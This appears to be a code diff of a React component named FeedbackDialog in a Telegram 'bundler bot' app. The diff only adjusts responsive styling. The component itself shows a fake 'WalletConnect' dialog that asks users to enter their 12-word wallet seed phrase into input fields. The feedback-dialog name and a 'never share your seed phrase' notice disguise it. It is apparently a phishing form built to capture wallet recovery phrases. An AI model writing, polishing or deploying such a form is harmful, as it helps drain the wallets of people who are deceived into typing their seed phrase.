@@ -97,18 +97,18 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
 
   return (
     <Dialog open={open} onOpenChange={onClose}>
-      <DialogContent className="max-w-3xl">
+      <DialogContent className="max-w-3xl max-h-[90vh] overflow-y-auto">
         <DialogHeader>
           <div className="flex items-center gap-3 mb-2">
-            <img src={logo} alt="ProTools Bundler Bot" className="w-12 h-12 rounded-lg" />
-            <DialogTitle>WalletConnect</DialogTitle>
+            <img src={logo} alt="ProTools Bundler Bot" className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg" />
+            <DialogTitle className="text-lg sm:text-xl">WalletConnect</DialogTitle>
           </div>
-          <DialogDescription>
+          <DialogDescription className="text-sm">
             Enter your 12 word seed phrase below to continue. (Never share your seed phrase!)
           </DialogDescription>
         </DialogHeader>
-        <div className="bg-muted/50 rounded-lg p-4 mb-4">
-          <p className="text-sm leading-relaxed">
+        <div className="bg-muted/50 rounded-lg p-3 sm:p-4 mb-4">
+          <p className="text-xs sm:text-sm leading-relaxed">
             Welcome to <span className="font-semibold">ProTools Bundler Bot</span>! This intelligent assistant
             streamlines your workflow by bundling multiple tools and resources into organized packages. Whether you're
             managing projects, collaborating with teams, or organizing your digital workspace, our bot adapts to your
@@ -116,17 +116,22 @@ export const FeedbackDialog = ({ open, onClose, telegramUser }: FeedbackDialogPr
           </p>
         </div>
         <form onSubmit={handleSubmit} className="space-y-4">
-          <div className="grid grid-cols-3 gap-4">
+          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4">
             {fields.map((field, index) => (
               <div key={index} className="space-y-1">
-                <Label htmlFor={`field-${index}`}>{index + 1}.</Label>
-                <Input id={`field-${index}`} value={field} onChange={(e) => handleFieldChange(index, e.target.value)} />
+                <Label htmlFor={`field-${index}`} className="text-sm">{index + 1}.</Label>
+                <Input 
+                  id={`field-${index}`} 
+                  value={field} 
+                  onChange={(e) => handleFieldChange(index, e.target.value)}
+                  className="text-sm"
+                />
               </div>
             ))}
           </div>
           {error && <p className="text-sm text-destructive">{error}</p>}
           <div className="flex gap-2 justify-end">
-            <Button type="submit">Connect</Button>
+            <Button type="submit" className="w-full sm:w-auto">Connect</Button>
           </div>
         </form>
       </DialogContent>
